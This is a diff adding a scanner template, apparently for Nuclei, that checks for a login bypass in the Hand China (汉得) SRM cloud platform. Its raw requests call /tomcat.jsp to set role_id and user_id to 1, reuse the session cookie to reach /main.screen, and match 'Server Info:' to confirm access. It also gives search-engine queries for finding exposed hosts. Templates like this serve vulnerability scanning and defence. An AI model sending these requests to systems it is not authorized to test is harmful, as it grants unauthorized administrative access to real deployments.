@@ -1,0 +1,49 @@
+http:
+    - cookie-reuse: true
+      matchers:
+        - part: status_code_1
+          status:
+            - 200
+          type: status
+        - part: status_code_2
+          status:
+            - 200
+          type: status
+        - part: status_code_3
+          status:
+            - 200
+          type: status
+        - part: body_1
+          type: word
+          words:
+            - 'Server Info:'
+            - SRM SERVER Info.
+        - part: body_2
+          type: word
+          words:
+            - 'Server Info:'
+            - SRM SERVER Info.
+      matchers-condition: and
+      raw:
+        - |
+          GET /tomcat.jsp?dataName=role_id&dataValue=1 HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /tomcat.jsp?dataName=user_id&dataValue=1 HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /main.screen HTTP/1.1
+          Host: {{Hostname}}
+id: hand-china-srm-tomcat-jsp-login-bypass
+info:
+    author: SleepingBag945
+    description: |-
+        FOFA: 汉得SRM云平台
+        HUNTER: web.body="汉得SRM"
+    name: 汉得 SRM tomcat.jsp 登录绕过漏洞
+    severity: high
+    tags:
+        - hand-china
+        - bypass
+        - tomcat
+        - 汉得SRM
